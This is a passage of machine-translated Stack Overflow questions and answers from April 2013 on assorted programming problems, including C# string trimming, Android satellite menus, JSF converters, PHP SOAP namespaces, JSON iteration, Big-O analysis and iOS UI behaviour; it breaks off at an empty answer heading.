            string ElementsNum = RoundedValues.Count.ToString();
            DateTime dt = System.DateTime.Now;
            var year = dt.ToString("yy");
            var month = dt.ToString("MM");
            var day = dt.ToString("dd");
            var minute = dt.ToString("mm");
            using (var fs = File.OpenWrite(toFile))
            using (TextWriter sw = new StreamWriter(fs))
            {
                sw.Write("NA" + "," + dt.Hour.ToString() + "," + minute + "," + day + ","
                                      + month + "," + year + "," + "ALTEST " + "," +
                                      "ALTEST " + "," + heatgrade + "    " + "," + "    " + "," + heatname + "," +
                                      DT2.Rows[0][3].ToString() + "," + heatgrade + "," + "OE2" + "," + "," +
                                      "," + "," + "," + "," + "," + " " + ElementsNum);

                foreach (var pair in RoundedValues.Zip(Elements, (a, b) => new { A = a, B = b }))
                {
                    sw.Write(pair.B.ToString() + ", " + pair.A.ToString() + ",");
                }
            } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T01:07:09.783

您可以使用`TrimEnd`，例如：

```
var theString = "abcd,";
var trimmedString = theString.TrimEnd(new[]{','}); 
```

就您而言，如果我没记错的话，这就是您希望它发生的地方：

```
sw.Write(pair.B.ToString() + ", " + pair.A.ToString() + ","); 
```

如果是这样，您可以这样做：

```
var pairs = pair.B.ToString() + ", " + pair.A.ToString() + ",";
sw.Write(pairs.Trim().TrimEnd(new[]{','})); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T01:09:46.773

这是一种 linqy 方法。这将使用 linq 的聚合函数。

```
var x = RoundedValues.Zip(Elements, (a, b) => new { A = a, B = b })    
  .Aggregate("", (old, item) => {
            return old + (old == "" ? "" : ", ") + 
               item.B.ToSTring() + ", " + item.A.ToString();
   });
sw.Write(x); 
```

版本二（go go join！）使用 linq 创建一个包含对的字符串数组，然后使用 join 将这些对以逗号分隔。

```
string [] x = RoundedValues.Zip(Elements, 
     (a, b) => b.ToSTring() + ", " + a.ToString() ).ToArray();
sw.Write(String.Join(", ",x)); 
```

可能以下方法可行，但我无法测试它......这看起来确实很性感（主要是因为它是一条线，每个人都喜欢一条线解决方案）：

```
sw.Write(String.Join(", ",
   RoundedValues.Zip(Elements, 
     (a, b) => b.ToSTring() + ", " + a.ToString() )
)); 
```

哪个会取代

```
foreach (var pair in RoundedValues.Zip(Elements, (a, b) => new { A = a, B = b }))
{
   sw.Write(pair.B.ToString() + ", " + pair.A.ToString() + ",");
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T01:44:27.273

另一种选择是使用 StringBuilder。

```
...
StringBuilder sb = new StringBuilder();

foreach (var pair in RoundedValues.Zip(Elements, (a, b) => new { A = a, B = b }))
{
    sb.AppendFormat("{0}, {1},", pair.B, pair.A);
}
sw.Write(sb.ToString().TrimEnd(new[] { ' ', ',' }); 
```

# android - 在我的项目中设置卫星菜单

> ID：16204734
> 
> 赞同：0
> 
> 时间：2013-04-25T01:00:21.950
> 
> 标签：android

我在这里被指出了这个项目：

[https://github.com/siyamed/android-satellite-menu](https://github.com/siyamed/android-satellite-menu)

下载后看起来很棒。但是我无法在我的应用程序中获得一个简单的版本。我已将提供的 .jar 添加到我的项目中，它出现在依赖项中。我遇到的问题是xml文件。它是这样提供的：

```
<?xml version="1.0" encoding="utf-8"?>
<FrameLayout 
    xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:sat="http://schemas.android.com/apk/res/android.view.ext"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >

    <android.view.ext.SatelliteMenu
        android:id="@+id/menu"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_gravity="bottom|left" 
        android:layout_margin="8dp"
        sat:satelliteDistance="170dp"
        sat:mainImage="@drawable/ic_launcher"
        sat:totalSpacingDegree="90"
        sat:closeOnClick="true"
        sat:expandDuration="500"/>

</FrameLayout> 
```

SO上的另一篇文章说将包类型更改为您自己的包。所以我把它改成了：

```
xmlns:sat="http://schemas.android.com/apk/res/my.app" 
```

但我仍然在 xml 文件中收到此错误：

```
Multiple annotations found at this line:
    - error: No resource identifier found for attribute 'satelliteDistance' in package 
     'android.view.ext'
    - error: No resource identifier found for attribute 'mainImage' in package 'android.view.ext'
    - error: No resource identifier found for attribute 'closeOnClick' in package 
     'android.view.ext'
    - error: No resource identifier found for attribute 'expandDuration' in package 
     'android.view.ext'
    - error: No resource identifier found for attribute 'totalSpacingDegree' in package 
     'android.view.ext' 
```

我也试过在这里改变包裹减速：

```
<android.view.ext.SatelliteMenu
    android:id="@+id/menu" 
```

以及一个和另一个的组合。但我只是不断收到同样的错误。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-10-22T16:40:36.150

改变

```
xmlns:sat="http://schemas.android.com/apk/res/android.view.ext 
```

至

```
xmlns:sat="http://schemas.android.com/apk/res-auto" 
```

这应该有效，但对我有用。

不要忘记清理你的项目。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-28T14:57:40.397

在这里找到了一个类似的问题，[Implementing Satellite Menu for Android, XML File States No Resource Found](https://stackoverflow.com/questions/14679134/implementing-satellite-menu-for-android-xml-file-states-no-resource-found)

因此，您只需要将包名称更改`android.view.ext` 为您自己的包名称，例如`com.tac.grewords`，清理项目，现在一切都应该没问题了。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-24T05:58:58.570

```
SatelliteMenu menu = (SatelliteMenu) findViewById(R.id.satelliteMenu1);
    float distance = TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, 170, getResources().getDisplayMetrics());
    //The distance of items from the center button
    menu.setSatelliteDistance((int) distance);
    //The duration of expand and collapse operations in milliseconds.
    menu.setExpandDuration(300);
    menu.setCloseItemsOnClick(true);
    //The degree between the first and the last item.
    menu.setTotalSpacingDegree(120);

    List<SatelliteMenuItem> items = new ArrayList<SatelliteMenuItem>();
    items.add(new SatelliteMenuItem(6, R.drawable.ic_action_search));
    items.add(new SatelliteMenuItem(5, R.drawable.ic_action_search));
    items.add(new SatelliteMenuItem(4, R.drawable.ic_action_search));
    items.add(new SatelliteMenuItem(3, R.drawable.ic_action_search));
    items.add(new SatelliteMenuItem(2, R.drawable.ic_action_search));
    items.add(new SatelliteMenuItem(1, R.drawable.ic_action_search));
    menu.addItems(items); 
```

从项目属性中添加卫星菜单作为库。然后，您将在自定义和库视图中获得卫星菜单，只需将其拖放到您的 xml 文件中。然后将上面的代码放入您的java文件中，该文件实际上为卫星菜单设置数据。

# validation - 如何禁用一个输入字段的默认 JSF 验证和转换

> ID：16204743
> 
> 赞同：3
> 
> 时间：2013-04-25T01:01:10.270
> 
> 标签：validation, jsf-2, input, primefaces

我想禁用一个输入字段 inputtext 的默认 JSF 验证和转换，以便能够使用 jQuery 对其进行验证。

```
<p:column headerText="Quantité"> 
    <p:inputText widgetVar="input_qte" styleClass="my_qte" value="#{arti.qte}">
        <f:validateBean disabled="true"/>
    </p:inputText> \
    <h:outputText styleClass="my_qtemax" value="#{arti.qtemax}" />
    <div class="my_validator" style="display : none;">Valeur Invalide</div>
</p:column> 
```

`#{arti.qte}`绑定到一个`Double`属性。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T01:06:41.977

据我在目前提供的信息中看到的，该组件还没有经过验证。`String`当您将非类型绑定为输入组件的值时，也许您特别指的是隐式转换？不，您不能禁用此功能。您只能通过提供一个不会引发异常但只会`null`在失败时返回的自定义转换器来解决它。

例如，通过扩展标准 JSF[`DoubleConverter`](http://docs.oracle.com/javaee/6/api/javax/faces/convert/DoubleConverter.html)并完全抑制`ConverterException`on `getAsObject()`：

```
@FacesConverter("lenientDoubleConverter")
public class LenientDoubleConverter extends DoubleConverter {

    @Override
    public Object getAsObject(FacesContext context, UIComponent component, String value) {
        try {
            return super.getAsObject(context, component, value);
        } catch (ConverterException ignore) {
            return null;
        }
    }

} 
```

然后用作：

```
<p:inputText ... converter="lenientDoubleConverter" /> 
```

* * *

**与具体问题无关**，请注意客户端验证/转换绝对不可靠。由于 JavaScript 完全在客户端运行，最终用户可以完全控制正在执行的代码。即最终用户可以轻松地禁用、绕过、欺骗它等。另请参阅[JSF2 验证客户端或服务器端？](https://stackoverflow.com/questions/4013410/jsf2-validation-clientside-or-serverside/)

# sphinx - ThinkingSphinx3：刚刚从 TS2 升级并收到奇怪的 sort_by 错误消息

> ID：16204744
> 
> 赞同：0
> 
> 时间：2013-04-25T01:01:11.650
> 
> 标签：sphinx, thinking-sphinx

我的广告模型中有以下属性：

```
has sort_by_date, :as => :timestamp, :sortable => true 
```

在 ads 表中有一个 sort_by_date 字段，它是一个日期时间字段。

但是，当我搜索时，将以下内容作为我的 :order 选项传递（我想先显示较新的广告，然后按相关性排序）

```
:order => "sort_by_date DESC, @weight DESC" 
```

我收到以下错误：

```
ThinkingSphinx::SphinxError (index ad_core: sort-by attribute 'sort_by_date' not found): 
```

谁能明白为什么会发生这种情况？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-27T19:56:03.803

好的，所以我通过将数据库中的 sort_by_date 字段从日期时间更改为时间戳来完成这项工作，希望这对其他人有所帮助。

# php - Wordpress get_page() 和插件短代码不起作用

> ID：16204745
> 
> 赞同：-2
> 
> 时间：2013-04-25T01:01:20.590
> 
> 标签：php, wordpress

我有一个查询要在 wordpress 中发帖：

```
<?php 
   $page_content = get_page(2);
   echo do_shortcode($page_content->post_content);
?> 
```

正在加载的页面中有一个用于加载滑块的短代码。滑块标记正在加载，但插件所需的 javascript 和 css 文件未显示在源代码中。我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T01:50:36.927

您没有提供任何相关的源代码或链接，但是您是否加载了 JS 和 css ？滑块是否来自插件？是你的插件吗？是否为所述页面激活了插件？你有`enqueue`你的风格和脚本吗？

无论如何，作为第一个措施，尝试在页面上手动加载它

```
function my_scripts_enq()  
{  
    // Register the script for a plugin:  
    wp_register_script( 'custom-script', plugins_url( '/js/custom-script.js', __FILE__ ) );  
    // or  
    // Register the script for a theme:  
    wp_register_script( 'custom-script', get_template_directory_uri() . '/js/custom-script.js' );  

    //  then enqueue the script:  
    wp_enqueue_script( 'custom-script' );  
}  
add_action( 'wp_enqueue_scripts', 'my_scripts_enq' ); 
```

对于快速调试，您可以简单地尝试：

```
 if( is_page(42) ){
 add_action( 'wp_enqueue_scripts', 'my_scripts_enq' );
} 
```

对于您应该做的样式：

```
function load_styles()  
{  
    // Register the style for a plugin:  
    wp_register_style( 'custom-style', plugins_url( '/css/custom-style.css', __FILE__ ), array(), '20120208', 'all' );  
    // or  
    // Register the style for a theme:  
    wp_register_style( 'custom-style', get_template_directory_uri() . '/css/custom-style.css', array(), 'se16205117', 'all' );  

    // then enqueue the style:  
    wp_enqueue_style( 'custom-style' );  
}  
add_action( 'wp_enqueue_scripts', 'load_styles' ); 
```

顺便说一句 - 作为旁注，来自[法典](http://codex.wordpress.org/Function_Reference/get_page#Examples)

```
$page_id = 2;
$page_data = get_page( $page_id ); 
```

> // 您必须将一个变量传递给 get_page 函数。如果您传入一个值（例如 get_page ( 123 ); ），WordPress 将生成错误。默认情况下，这将返回一个对象。

# php - PHP - 在 SoapClient 中设置命名空间

> ID：16204747
> 
> 赞同：1
> 
> 时间：2013-04-25T01:01:32.917
> 
> 标签：php, xml, soap, soap-client

我遇到了 SOAP 调用的问题，我相信它与命名空间有关。我从要发送到的服务器收到不正确的响应，这似乎是由于不正确的 SOAP 信封和命名空间。

```
152     protected function callWithSOAP($xml) {
153         
154         try {
155             $soapClient = new SoapClient($this->mercuryWSDL, array('trace'=>1));
156         } catch (Exception $e) {
157             throw new Exception($e->getMessage());
158         }
159         
160         $message = array(
161             'tran'=> $xml,
162             'pw'=> $this->mercuryPassword
163         );      
164         
165         // Make SOAP Call
166         try {
167             $request = $soapClient->CreditTransaction($message);
168         } catch (Exception $e) { 
169             throw new Exception($e->getMessage());
170         }
171 
172         $res = $soapClient->__getLastRequest();
173         return $res;
174 
175         return $request;
176     } 
```

我在方法签名中输入的 XML 很好，我已经确认这与服务器所期望的相同，特别是有问题的肥皂请求。

这是我使用 SoapClient 发送的 SOAP 请求：

```
<?xml version="1.0" encoding="UTF-8"?>

<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://www.mercurypay.com">
    <SOAP-ENV:Body>
        <ns1:CreditTransaction>
            <ns1:tran>
            <?xml version="1.0"?>
            <TStream>
                <Transaction>
                    <MerchantID>******</MerchantID>
                    <TranType>Credit</TranType>
                    <TranCode>FSASale</TranCode>
                    <InvoiceNo>12</InvoiceNo>
                    <RefNo>12</RefNo>
                    <Account>
                        <AcctNo>*******</AcctNo>
                        <ExpDate>****</ExpDate>
                    </Account>
                    <Amount>
                        <Purchase>25</Purchase>
                        <FSAPrescription>25</FSAPrescription>
                    </Amount>
                </Transaction>
            </TStream>
        </ns1:tran>
        <ns1:pw>xyz</ns1:pw>
    </ns1:CreditTransaction>
</SOAP-ENV:Body> 
```

但这是它实际所期望的......我该如何匹配这个：

```
<soapenv:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:mer="http://www.mercurypay.com" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Body>
<mer:CreditTransaction>
<mer:tran>
<?xml version="1.0"?>
<TStream>
  <Transaction>
<MerchantID>******</MerchantID>
<TranType>Credit</TranType>
<TranCode>FSASale</TranCode>
<InvoiceNo>1</InvoiceNo>
<RefNo>1</RefNo>
<Account>
  <AcctNo>************</AcctNo>
  <ExpDate>****</ExpDate>
</Account>
<Amount>
  <Purchase>63.54</Purchase>
  <FSAPrescription>63.54</FSAPrescription>
</Amount>
</Transaction>
</TStream>
</mer:tran>
<mer:pw>xyz</mer:pw>
</mer:CreditTransaction>
</soapenv:Body>
</soapenv:Envelope> 
```

你会注意到到处都是“mer：”。我相信这是我需要从服务器获得正确响应的原因。请帮帮我，这应该明天出去测试，我们才意识到对此的反应非常不一致。

感谢您提供的任何帮助，我非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T09:12:57.910

命名空间前缀在`<mer:`文档中定义（in `<soapenv:Envelope ... xmlns:mer="http://www.mercurypay.com" ... >`），但是不允许在与文档开头不同的位置使用[XML 声明。*`<?xml version="1.0"?>`*](http://xmlwriter.net/xml_guide/xml_declaration.shtml)

这是您违反的 XML 中的一个具体规则，您不能指望这会像 SOAP 基于 XML 一样起作用。

`'tran'=> $xml`您设置的方式，尤其是as of`$xml`上下文中的内容似乎在这里是错误的。将数据放入正确的格式，以便可以正确传递（应用程序的该部分被隐藏，就像隐藏 WSDL 的源一样，因此无法提供进一步的信息或提示）。`$message``CreditTransaction($message)``$xml`

# json - 使用带有 JSON 的 For 循环

> ID：16204753
> 
> 赞同：2
> 
> 时间：2013-04-25T01:02:33.413
> 
> 标签：json, for-loop

我在下面有一个 JSON 对象，并且有多个嵌套分区，第一个没有任何标识符。我正在尝试使用 for 循环进入最后一个部门中的团队，但我无法访问它们。需要一些指导。

```
{
    "division": {
        "division": [
            {
                "team": {
                    "id": "229525",
                    "name": "MyTeam",
                    "photo": "",
                    "visible": "True",
                    "RosterView": "True",
                    "PublicResults": "True",
                    "Statistics": "False",
                    "privilege": [
                        "False",
                        "True",
                        "True",
                        "True",
                        "True",
                        "True",
                        "True"
                    ]
                },
                "name": "Boys 9-10",
                "id": "12897",
                "sort": "0",
                "open": "0"
            },
            {
                "team": [
                    {
                        "id": "229523",
                        "name": "Cougars",
                        "photo": "",
                        "visible": "True",
                        "RosterView": "True",
                        "PublicResults": "True",
                        "Statistics": "False",
                        "privilege": [
                            "False",
                            "True",
                            "True",
                            "True",
                            "True",
                            "True",
                            "True"
                        ]
                    }, 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T01:39:19.597

**更新**：嗯，仔细阅读您的 JSON 后，我注意到第一师只有 1 个团队，因为团队只有一个对象。但似乎第 2 师有不止 1 个团队，因为团队中有一系列对象。我想你必须处理一个部门只有一个团队的情况。

您的 for 循环几乎是正确的。试试这个：

```
var divisions = JSONObject.division.division;

for (var i=0; i < divisions.length; i++) {
    // handle division of one team here,
    // don't need for loop if there only one team
    // just do division[i].team.id
    for (var j=0; j < divisions[i].length; j++) {
        var teamId = divisions[i].team[j].id;
        alert(teamId);
    }
} 
```

你的循环是

```
for (i=0; i <= JSONObject.division.division.teams[i].length; i++) { } 
```

它有两个问题，首先你通过`i <= ...length; i++` 第二个跳过最后一个元素，`JSONObject.division.division.teams[i]`不是一个数组，但是这个`JSONObject.division.division[i].team`会给你一个分区中所有团队的数组。然后你可以通过它在数组中的索引来获得你想要的团队:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T01:24:44.443

首先，您应该在 json 中修复括号。

```
var a = {
    "division": {
        "division": [
            {
                "team": {
                    "id": "229525",
                    "name": "MyTeam",
                    "photo": "",
                    "visible": "True",
                    "RosterView": "True",
                    "PublicResults": "True",
                    "Statistics": "False",
                    "privilege": [
                        "False",
                        "True",
                        "True",
                        "True",
                        "True",
                        "True",
                        "True"
                    ]
                },
                "name": "Boys 9-10",
                "id": "12897",
                "sort": "0",
                "open": "0"
            },
            {
                "team": [
                    {
                        "id": "229523",
                        "name": "Cougars",
                        "photo": "",
                        "visible": "True",
                        "RosterView": "True",
                        "PublicResults": "True",
                        "Statistics": "False",
                        "privilege": [
                            "False",
                            "True",
                            "True",
                            "True",
                            "True",
                            "True",
                            "True"
                        ]
                    }
                   ]
           }
        ]
    }
} 
```

然后您可以通过以下方式到达第二个“团队”对象：

```
a['division']['division'][1]['team'][0]['id']; 
```

这会给你`id`。你可以选择任何你想要的。它没有那么复杂。就像拼图一样阅读它。

*这是现场示例：* [JSFiddle](http://jsfiddle.net/JLSRm/)

**这里有一些 for 循环：**

```
var json1 = a['division']['division'][1]['team'][0]; // this is for second team array,
    json2 = a['division']['division'][0]['team']; // this is for first team object,

for (obj in json1){
    return json[obj];
}; 
```

根据您的 json，第一个和第二个`teams`数据类型不同。第一队是数组，但第二队是对象。这就是为什么有两个不同的变量。

# computer-science - 什么是嵌套循环的大 O 表示法，其中内部循环运行固定次数而不管 N 是多少？

> ID：16204754
> 
> 赞同：2
> 
> 时间：2013-04-25T01:02:36.253
> 
> 标签：computer-science, big-o

```
function DoStuff(someNumber) {
    for(var i = 1; i <= someNumber; i++) {
        // some arbitrary logic
        for(var a = 0; a <= 3; a++) { // This loop gets run 4 times regardless of i
            // Do something 
        }
    }
} 
```

这个方法的 BigO 表示法是 O(n) + 4，因此只是 O(n)？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T01:11:38.707

这是 O(n)，原因如下：

内部循环执行 N 次（其中 N 是代码中的“someNumber”）。当然，它会导致 4 次处决。这并不意味着您的程序是 O(n) + 4，正如您所建议的那样（无论如何，对于大 O 表示法来说，这不是正确的语法，您的意思是 O(n+4) 或 O(n) + O(4)） . 这意味着你的程序是 O(4*n)。当一个循环嵌套在另一个循环中时，您将这些循环的两个边界相乘。也就是说，如果外循环一直到 M 而内循环一直到 N，只要没有其他棘手的代码，大 O 将是 O(M*N)。所以在这种情况下，你将 n 乘以 4。

然后应用常数乘法规则。4 是一个常数，因此 O(n*4) 简化为 O(n)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T01:05:55.623

是的，`O(4*n)`就是 ，与 相同`O(n)`。你可以这样想：由于循环重复了固定的次数，你可以像这样“展开”它：

```
for(var i = 1; i <= someNumber; i++) {
    // some arbitrary logic
    // Do something
    // Do something
    // Do something
    // Do something
} 
```

这绝对是`O(n)`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T01:06:24.527

该算法确实在 O(n) 时间内运行，但您的分析是错误的。如果你使用那些嵌套循环，你会意识到

*   内循环总是运行固定次数，因此每次执行内循环时，它都会执行 O(1) 的工作。

*   外循环执行 O(n) 次。每次迭代都会做一些恒定的工作，加上运行内部循环所需的工作。因此，每次迭代都会做 O(1) 的工作。因此，运行循环嵌套所需的总工作量为 O(n)。

请注意，您不要将两者加在一起 ​​- 说因为内部循环运行 4 次而外部循环运行 O(n) 次，所以工作是 O(n) + 4 = O(n) 是不正确的. 相反，您必须将它们相乘。结果是相同的答案，但这并不意味着该方法是正确的。例如，如果内部循环也运行了 n 次，那么您的分析会错误地指出运行时间是 O(n) + O(n) = O(n)，而实际上运行时间是 O(n) × O (n) = O(n ² )。

希望这可以帮助！

# javascript - 如果语句不起作用，请简写使用 return

> ID：16204755
> 
> 赞同：0
> 
> 时间：2013-04-25T01:02:41.683
> 
> 标签：javascript, if-statement, return

我似乎无法理解为什么会这样：

```
if(n < i)
{
    functoin();
}
else
{
    return;
} 
```

虽然这不起作用：

```
(n < i) ? function() : return; 
```

为什么速记 if 语句不起作用？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T01:03:50.520

`return`不能在表达式中使用。或许你可以试试

```
return (n < i) ? function() : undefined; 
```

但这只是在您对每种情况都有一件事要做的情况下。

# javascript - document.head 诉 document.getElementsByTagName("head")[0]

> ID：16204756
> 
> 赞同：15
> 
> 时间：2013-04-25T01:02:50.120
> 
> 标签：javascript, dom

using`document.head`和 using 和有什么不一样`document.getElementsByTagName("head")[0]`？我运行的测试表明它们都需要大约一毫秒。

我也看过

```
document.head||document.getElementsByTagName("head")[0]; 
```

这会让我相信那个`document.head`更快，另一个更兼容，~~除了我所做的测试证明了这一点。~~

如果一个更兼容，为什么还要使用另一个呢？

**更新：**正如一些人指出的那样，我的测试是错误的。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-04-25T01:10:22.517

使用这样的`||`算子是特征检测的一种形式。使用时，如果第一个值未定义，则返回后一个值。

因此对于

```
document.head || document.getElementsByTagName("head")[0]; 
```

原因是如果`document.head`不支持至少返回正确的值。

至于你的速度测试，一毫秒是很长的时间。我怀疑它真的花了那么长时间。事实上，我为此做了一个***[`jsPerf`](http://jsperf.com/document-head-versus-bytagname)***。它表明该`getElementsByTagName`函数大约慢了 80%。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-25T01:06:50.400

根据[MDN](https://developer.mozilla.org/en-US/docs/DOM/document.head)，`document.head`仅在 IE 9 中获得支持，因此使用其他方法作为后备可以保护您免受浏览器不兼容的影响

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-25T01:04:38.967

这更像是一个方便的问题而不是性能问题（尽管`document.head`应该有微不足道的好处）。使用您喜欢的任何一个，或者将一个用作另一个的后备（如您的示例代码所做的那样）。有后备是明智的，因为`document.head`在 IE 6-8 中不支持。

它不太可能`getElementsByTagName`很快被弃用，所以这不是一个很好的例子来说明何时提供后备是好的。您可以安全地自行使用更详细的路由，并在未来享受支持。

与旧浏览器相比，这些类型的事情的更好例子是事件，以及它们如何在现代浏览器中传递。看到这样的事情并不少见：

```
function callback (event) {
    var id = (event || window.event).target.id;
} 
```

但是，在这种情况下，该`window.event`部分对于遗留支持是必需的。如果`event`对象是`undefined`，我们假设事件是`window`对象的成员。随着浏览器的成熟，`window.event`不再是*一件事*，而这些测试一致地返回`event.target.id`。

同样，您的情况有点不同，因为`getElementsByTagName`可能永远不会像`window.event`以前那样被弃用或消失。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-25T01:06:59.610

只是方便，因为您应该每页只有一个。就像有一个直接的快捷方式一样`document.body`，虽然`document.body`是标准的，你不需要后备。

```
document.body || document.getElementsByTagName("body")[0] 
```

`document.head`除非您只支持 IE9+，否则我不会使用。在那之前，我会坚持`document.getElementsByTagName("head")[0]`

如果您想要一个不需要随着时间推移而更改的版本，您可以在脚本顶部执行以下操作

```
document.head = document.head || document.getElementsByTagName("head")[0]; 
```

这样，当您放弃对 IE8 的支持时，您可以只更改一个位置（或者甚至可以将其留在那里，因为它不会造成伤害，但这将是死代码）。上面的代码还可以确保您只查询 DOM 一次

# ios - CustomView UILabel 设置文本崩溃

> ID：16204758
> 
> 赞同：0
> 
> 时间：2013-04-25T01:03:05.033
> 
> 标签：ios, objective-c, debugging, uilabel, uicollectionviewcell

我有一个自定义视图 - 带有标签的 DetailSubView.h

```
@property (retain, nonatomic) UILabel *titleLabel;
@property (retain, nonatomic) UILabel *descHeaderLabel; 
```

在自定义 UICollectionViewCell 上，我有

```
@property   (strong, nonatomic) DetailSubView          *detailView; 
```

当我设置文本时，我收到无法识别的选择器错误。

```
[self.detailView.titleLabel setText:@"text"]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T01:09:43.067

那是因为您的 titleLabel 是在 DetailView 中声明的，但您正试图从 DetailSubView 类型的类中访问它。它无法访问 DetailSubView 上您的属性的 getter 方法，因为您没有在那里声明它。

# objective-c - UIActivityIndi catorView 保持动画前面的 CATransition pushViewController

> ID：16204760
> 
> 赞同：0
> 
> 时间：2013-04-25T01:03:24.503
> 
> 标签：objective-c, uiactivityindicatorview, catransition

我正在尝试以与使用 CATransition 淡入淡出推送视图控制器相同的方法停止 UIActivityIndi​​catorView 上的动画。

无论我设置持续时间多长，UIActivityIndi​​catorView 都不会停止动画，然后淡入下一个视图控制器，而是在整个淡入淡出过程中继续设置动画。

有什么想法可以让旋转停止，然后以相同的方法推动/淡入淡出吗？

```
- (void)pushView:(NSNotification *)notification {

    [self.activityIndicator stopAnimating];
    NextViewController* nextViewController = [[NextViewController alloc] init];
    CATransition *transition = [CATransition animation];
    transition.duration = 1.5f;
    transition.timingFunction = [CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseInEaseOut];
    transition.type = kCATransitionFade;
    [self.navigationController.view.layer addAnimation:transition forKey:nil];
    [self.navigationController pushViewController:nextViewController animated:NO];

} 
```

**编辑 1**

`stopAnimating`与大卫的回答一样，如果我使用`dispatch_after`并延迟了几分之一秒，我就能成功。有没有更好的方法来做到这一点？：

```
- (void)pushView:(NSNotification *)notification {

    [self.activityIndicator stopAnimating];

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 0.0001 * NSEC_PER_SEC), dispatch_get_main_queue(), ^(void){
        NextViewController* nextViewController = [[NextViewController alloc] init];
        CATransition *transition = [CATransition animation];
        transition.duration = 1.5f;
        transition.timingFunction = [CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseInEaseOut];
        transition.type = kCATransitionFade;
        [self.navigationController.view.layer addAnimation:transition forKey:nil];
        [self.navigationController pushViewController:nextViewController animated:NO];
    });
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T01:50:24.433

我以前遇到过类似的事情。您正在运行的称为**同步执行**。在同步执行中，UI 不会更新，直到编译器终止函数，也就是`}`. 你如何解决这个问题？简单的。**只需在异步调度**中运行任何方法来更新 UI ：

```
- (void)pushView:(NSNotification *)notification {

dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){

dispatch_async(dispatch_get_main_queue(), ^(void){
    [self.activityIndicator stopAnimating];
});

NextViewController* nextViewController = [[NextViewController alloc] init];
CATransition *transition = [CATransition animation];
transition.duration = 1.5f;
transition.timingFunction = [CAMediaTimingFunction functionWithName:kCAMediaTimingFunctionEaseInEaseOut];
transition.type = kCATransitionFade;
[self.navigationController.view.layer addAnimation:transition forKey:nil];
[self.navigationController pushViewController:nextViewController animated:NO];

});

} 
```

哎呀！我忘了把其他代码放在一个简单的调度中！尝试编辑后的代码，它应该可以工作！

这样，`[self.activityIndicator stopAnimating];`在优先级线程上运行，而函数中的其余代码在默认优先级线程中运行，有效地同时运行代码，就像您期望的那样。

干杯!

# ios - willRotateToInterfaceOrientation 未在模态呈现的视图控制器中调用

> ID：16204766
> 
> 赞同：0
> 
> 时间：2013-04-25T01:04:57.133
> 
> 标签：ios, objective-c, ios6, uiinterfaceorientation, screen-rotation

我的整个应用程序都是纵向的。当您在集合视图控制器中点击图像时，我会以模态方式在 MWPhotoBrowser 视图控制器中呈现图像。所以我想在那里支持多个方向。我只支持 iOS 6，并且有以下定位方法：

```
- (BOOL)shouldAutorotate {
    return YES;
}

- (NSUInteger)supportedInterfaceOrientations {
    return UIInterfaceOrientationMaskAllButUpsideDown;
} 
```

这些被调用，但是`willRotateToInterfaceOrientation`随后`willAnimateRotationToInterfaceOrientation`并且`didRotateFromInterfaceOrientation`永远不会被调用。

它不会出现在导航控制器或任何东西中。不知道我还需要在这里做什么才能仅在模态呈现的视图控制器中支持旋转。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T03:03:58.723

重新阅读文档后，我相信我的应用程序必须在应用程序（plist）级别支持横向。在这种情况下，我猜我将不得不更改其他视图控制器中支持的方向以限制它。

# android - Android ListView - 根据值更改元素的背景

> ID：16204767
> 
> 赞同：0
> 
> 时间：2013-04-25T01:05:05.570
> 
> 标签：android, listview, background

我有一个列出费用和收入的清单。我希望 ListViewer 自动将背景更改为收入的绿色或费用的红色，这可能吗？

```
final DbCon database = new DbCon(this);
        final ListView Viewer = (ListView)findViewById(R.id.historyViewer);
        //date1, time1, desc1, val1, cat1, type1
        final SimpleAdapter La = new SimpleAdapter(this, database.GetMonths(), R.layout.mviewer, new String[] {"month"}, new int[] {R.id.month_name});
        Viewer.setAdapter(La); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:28:00.707

在没有看到任何代码的情况下，很难提供任何“真正的”帮助，但这是可能的。您可以使用类似的东西更改背景颜色

```
rowView.setBackgroundColor(Color.GREEN); 
```

假设`rowView`是您当前`View`在`List`. 您也可以根据自己的需要进行`styles`更改。`themes`

* * *

## 回答 #2

